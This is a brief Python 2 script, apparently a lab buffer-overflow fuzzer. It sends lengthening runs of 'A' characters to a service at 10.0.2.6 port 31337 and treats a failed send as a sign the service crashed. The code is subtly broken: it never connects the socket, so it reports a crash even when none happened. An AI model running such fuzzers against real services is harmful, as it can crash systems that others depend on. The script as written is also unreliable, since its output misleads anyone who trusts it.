#!/usr/bin/python
import sys, socket

ip = '10.0.2.6'
port = 31337
buffer = ['A']
counter = 100
timeout = 5

while len(buffer) < 10:
    buffer.append('A'*counter)
    counter = counter + 100
try:
    for string in buffer:
        print '[+] Sending %s bytes...' % len(string)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
   
        s.send(string + '\r\n')
        print '[+] Done '
except:
    print '[!] A connection can not be stablished to the program. It may have crashed.'
    sys.exit(0)
finally:
    s.close()